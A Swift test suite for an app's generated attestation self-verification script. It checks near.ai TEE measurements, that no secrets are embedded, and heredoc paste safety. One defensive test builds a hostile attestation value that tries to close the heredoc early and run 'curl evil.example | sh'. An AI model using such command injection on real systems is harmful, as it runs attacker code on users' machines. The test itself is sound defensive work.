//
//  SelfVerifyScriptTests.swift
//  teemoonTests
//
//  The generated self-verification script: session values embedded, no
//  secrets ever included, deterministic timestamps, and the structure the
//  documented near.ai suite requires.
//

import Foundation
import Testing
@testable import teemoon

@Suite("SelfVerifyScript")
struct SelfVerifyScriptTests {

    private func summary(attestation: AttestationRecord? = .preview) -> AttestationSummary {
        AttestationSummary(
            attestation: attestation, state: .ok, timedOut: false, provider: .nearAI,
            lastRequestUsedE2EE: nil, lastE2EEFailReason: nil,
            verifiedResponseCount: 0, mismatchedResponseCount: 0,
            attestationFetchFailed: false)
    }

    @Test func nilWithoutAttestation() {
        #expect(summary(attestation: nil).selfVerifyScript == nil)
    }

    @Test func embedsSessionValues() throws {
        let script = try #require(summary().selfVerifyScript)
        let att = AttestationRecord.preview
        #expect(script.contains(att.signingAddress!))
        #expect(script.contains(att.gpuSigningAddress!))
        #expect(script.contains(att.composeHash))
        #expect(script.contains(att.gpuNodeComposeHash!))
        #expect(script.contains(att.modelEd25519PubKey!.hexString))
        #expect(script.contains(Provider.nearAI.model))
    }

    /// Regression: gateway identities only appear in the gateway's report and
    /// node identities only on the direct host — verifying against a single
    /// report produced guaranteed false failures for gateway-captured values.
    @Test func fetchesBothGatewayAndDirectReports() throws {
        let script = try #require(summary().selfVerifyScript)
        #expect(script.contains(#"("gateway", SESSION["gateway_base"]"#))
        #expect(script.contains(#"("model host", SESSION["direct_base"]"#))
        #expect(script.contains(#"SESSION["gpu_node_compose_hash"]"#))
    }

    /// Regression: the script embedded the gateway's TDX measurement and its
    /// guest OS image under SESSION — printing both to the reader — and then
    /// never compared either against the live service. A trust artifact that
    /// SHOWS a measurement it does not check claims more than it does. They
    /// are one level below the compose hash: the compose says which containers
    /// run, these say what the machine booted.
    @Test func checksTheMeasurementsItEmbeds() throws {
        let script = try #require(summary().selfVerifyScript)
        for field in ["mrtd", "os_image_hash"] {
            let embedded = script.contains("\"\(field)\":")
            let checked = script.contains("(\"\(field)\", \"gateway")
            #expect(embedded, "\(field) is no longer embedded — update this test")
            #expect(checked, "\(field) is embedded under SESSION but never compared")
        }
        // Against the GATEWAY's own report, never the merged set: the model
        // node reports its own os_image_hash, and matching a gateway value
        // against a different machine's image is a check that cannot fail.
        #expect(script.contains(#"gateway_report = next((r for label, r, _ in reports if label == "gateway"), None)"#))
        #expect(script.contains("live = {v.lower() for v in find_all(gateway_report, field)"))
        // Same three-way verdict the other identities get.
        #expect(script.contains("elif gateway_key_ok:"))
        #expect(script.contains("skip(f\"{what} not checked"))
    }

    @Test func timestampComesFromTheRecordNotNow() throws {
        let script = try #require(summary().selfVerifyScript)
        let expected = ISO8601DateFormatter().string(from: AttestationRecord.preview.fetchedAt)
        #expect(script.contains(expected))
    }

    @Test func neverEmbedsSecrets() throws {
        let script = try #require(summary().selfVerifyScript)
        // The gateway now authenticates `/attestation/report`, so the script DOES
        // send a bearer token — but only one it read from the environment at run
        // time. The literal must never appear next to anything but that variable.
        #expect(script.contains(#"os.environ.get("NEARAI_CLOUD_API_KEY") or os.environ.get("API_KEY")"#))
        #expect(script.contains(#"headers["authorization"] = f"Bearer {api_key}""#))
        // exactly one Bearer, and it is that interpolation
        #expect(script.components(separatedBy: "Bearer").count - 1 == 1)
        #expect(script.contains("NEARAI_CLOUD_API_KEY"))
    }

    /// Regression: `cloud-api.near.ai` began answering `/attestation/report`
    /// only to an authenticated caller ("Missing authorization header"). The
    /// script fetched it bare, so the gateway report failed on every run.
    @Test func authenticatesTheGatewayReportAndLeavesTheModelHostBare() throws {
        let script = try #require(summary().selfVerifyScript)
        #expect(script.contains(#"("gateway", SESSION["gateway_base"], f"&model={model_q}", API_KEY)"#))
        #expect(script.contains(#"("model host", SESSION["direct_base"], "", None)"#))
        #expect(script.contains("def fetch_report(base, algo=\"ecdsa\", extra=\"\", api_key=None):"))
        // a 401 with no key on hand is "not checked", not "failed"
        #expect(script.contains("if e.code in (401, 403) and not key:"))
    }

    /// Regression: a report that could not be fetched left its identities out
    /// of the live sets, and the comparison read that ABSENCE as a changed
    /// identity — printing "code identity AND signing key both changed —
    /// treat with suspicion" at a service that had not changed at all. Absent
    /// evidence must skip the check, never fail it.
    @Test func anUnfetchableReportSkipsItsComparisonsInsteadOfFailingThem() throws {
        let script = try #require(summary().selfVerifyScript)
        #expect(script.contains("unchecked = bool(missing)"))
        #expect(script.contains("elif addr and unchecked:"))
        #expect(script.contains("skip(f\"{label} signing key not checked"))
        #expect(script.contains("skip(f\"{label} code identity (compose hash) not checked"))
        // the hard-failure branch still exists for the case it was written for:
        // live evidence in hand, and neither identity matches
        #expect(script.contains("bad(f\"{label} code identity (compose hash) AND signing key both changed"))
    }

    @Test func pastesIntoATerminalAsOneBlock() throws {
        let script = try #require(summary().selfVerifyScript)
        // Regression: the pasteable block must be pure executable shell. A
        // leading `#` comment line breaks when pasted into interactive zsh
        // (comments are off by default), running as "command not found: #".
        #expect(!script.hasPrefix("#"))
        // shell wrapper: heredoc writes the file, then runs it — starting at
        // the first executable line, no comment preamble.
        #expect(script.hasPrefix("cat > teemoon_verify.py <<'TEEMOON_VERIFY'\n#!/usr/bin/env python3"))
        #expect(script.hasSuffix("\nTEEMOON_VERIFY\npython3 teemoon_verify.py"))
        // the python body never collides with the heredoc delimiter
        #expect(!script.replacingOccurrences(of: "<<'TEEMOON_VERIFY'", with: "")
            .replacingOccurrences(of: "\nTEEMOON_VERIFY\n", with: "")
            .contains("TEEMOON_VERIFY"))
    }

    /// Regression: near.ai's cloned verifiers append their own `/v1`, so the
    /// BASE_URL handed to them must be the bare host — else the path doubles
    /// (…/v1/v1/chat/completions) and the gateway returns an upstream 404.
    @Test func stripsV1WhenHandingBaseToNearAIVerifiers() throws {
        let script = try #require(summary().selfVerifyScript)
        #expect(script.contains(#"SESSION["direct_base"].removesuffix("/v1")"#))
        // the un-stripped form must be gone
        #expect(!script.contains(#"env.setdefault("BASE_URL", SESSION["direct_base"])"#))
    }

    /// Compose-hash drift with the signing key intact is a legitimate redeploy,
    /// not a verification failure — it must be classified as a `warn`, and a hard
    /// failure reserved for when the key also changes.
    @Test func composeDriftWithIntactKeyIsAWarningNotAFailure() throws {
        let script = try #require(summary().selfVerifyScript)
        // the warn state and its non-failing counter exist
        #expect(script.contains(#"warn = _tally("warned""#))
        #expect(script.contains(#""passed": 0, "failed": 0, "skipped": 0, "warned": 0"#))
        // compose drift branches on whether the signing key still matched
        #expect(script.contains("elif key_ok:"))
        #expect(script.contains("warn(f\"{label} code identity (compose hash) changed"))
        // both-changed is still a hard failure
        #expect(script.contains("bad(f\"{label} code identity (compose hash) AND signing key both changed"))
        // warns never fail the run
        #expect(script.contains("return 1 if failed else 0"))
    }

    /// Regression: attestation values are decoded from the remote service's
    /// JSON — the very party the script checks. A value containing a raw
    /// newline plus the heredoc delimiter would close the heredoc early and
    /// execute the rest of the paste as shell on the user's machine. All
    /// control characters must be escaped into the python string literal.
    @Test func hostileAttestationValuesCannotEscapeTheHeredoc() throws {
        let hostile = AttestationRecord(
            composeHash: "abc\nTEEMOON_VERIFY\ncurl evil.example | sh\n",
            mrtd: "\"\"\"\nimport os\r\t", osImageHash: "x", intelQuote: "",
            composeManifest: nil, gpuArch: nil, gpuNodeComposeHash: nil,
            modelFileHash: nil, signingAddress: "0x4a\u{7f}\u{01}b",
            gpuSigningAddress: nil, modelEd25519PubKey: nil,
            quoteVerification: nil, gpuQuoteVerification: nil,
            modelQuoteVerification: nil, fetchedAt: Date(timeIntervalSince1970: 0),
            providerID: Provider.nearAI.id)
        let script = try #require(summary(attestation: hostile).selfVerifyScript)
        // the heredoc still terminates exactly once, at the real delimiter
        let delimiterLines = script.split(separator: "\n", omittingEmptySubsequences: false)
            .filter { $0 == "TEEMOON_VERIFY" }
        #expect(delimiterLines.count == 1)
        #expect(script.hasSuffix("\nTEEMOON_VERIFY\npython3 teemoon_verify.py"))
        // the hostile payload was flattened onto one line as escaped text
        #expect(script.contains(#"abc\nTEEMOON_VERIFY\ncurl evil.example | sh\n"#))
        // quotes, CR, tab, and other control chars can't break the literal
        #expect(script.contains(#"\"\"\"\nimport os\r\t"#))
        #expect(script.contains(#"0x4a\x7f\x01b"#))
    }

    @Test func coversTheDocumentedSuite() throws {
        let script = try #require(summary().selfVerifyScript)
        // stdlib stage + the --full stage delegating to near.ai's verifiers
        #expect(script.contains(#"def fetch_report(base, algo="ecdsa", extra="", api_key=None):"#))
        #expect(script.contains(#"attestation/report?signing_algo={algo}"#))
        // image provenance: the same definitive GitHub attestations query the
        // app runs (404 = no build record), not a reachability probe — the
        // sigstore search page returns HTTP 200 for any hash, even fake ones.
        #expect(script.contains("api.github.com/repos/{repo}/attestations/sha256:"))
        #expect(!script.contains("search.sigstore.dev"))
        #expect(script.contains(#""vllm-proxy-rs": "inference-proxy""#))
        #expect(script.contains("include_tls_fingerprint=true"))
        // inference layer: model YAML fetched at attested commit, hash-checked
        #expect(script.contains("cvm-compose-files"))
        #expect(script.contains("compose_up"))
        #expect(script.contains("nearai-cloud-verifier"))
        for verifier in ["model_verifier.py", "tls_verifier.py", "chat_verifier.py",
                         "encrypted_chat_verifier.py"] {
            #expect(script.contains(verifier))
        }
        // model name self-reported from inside the enclave is compared to the
        // session's model (docs: TLS page, "Verify Model Name")
        #expect(script.contains(#"find_all(r, "model_name")"#))
    }

    /// After a paste-and-run, the shell history holds the entire paste, so
    /// retyping `python3 teemoon_verify.py --full` is a chore. The quick pass
    /// must offer to continue into the full suite interactively — but only
    /// when stdin is a real terminal, so piped/CI runs stay non-interactive.
    @Test func quickPassOffersToContinueIntoFullSuite() throws {
        let script = try #require(summary().selfVerifyScript)
        #expect(script.contains("sys.stdin.isatty()"))
        #expect(script.contains("run the full suite now? [y/N]"))
        // declining (or non-tty) still prints the --full hint
        #expect(script.contains("re-run with --full"))
    }

    /// near.ai caches chat signatures on the node that served the completion;
    /// a lookup can land on a different node and return "Chat id not found or
    /// expired" — documented as transient ("simply retry"). Their reference
    /// chat_verifier crashes on it, so our script must retry and, if it keeps
    /// missing, warn rather than hard-fail.
    @Test func chatSignatureNodeMissRetriesThenWarns() throws {
        let script = try #require(summary().selfVerifyScript)
        #expect(script.contains(#""chat signatures (request/response hash + ecrecover)", retries=2"#))
        #expect(script.contains(#"transient = "not found or expired" in (r.stdout + r.stderr)"#))
        #expect(script.contains("documented near.ai transient, not a failed signature"))
    }

    /// The E2EE chat verifier must exercise the path teemoon actually uses:
    /// completions are E2EE via the GATEWAY, so its BASE_URL is the gateway
    /// base — not the direct host the plaintext chat verifier prefers.
    @Test func e2eeVerifierTargetsTheGateway() throws {
        let script = try #require(summary().selfVerifyScript)
        #expect(script.contains(#"SESSION["gateway_base"].removesuffix("/v1")"#))
        // only run when the session actually had an E2EE key
        #expect(script.contains(#"if SESSION["model_ed25519_pubkey"] and SESSION["gateway_base"]:"#))
    }
}
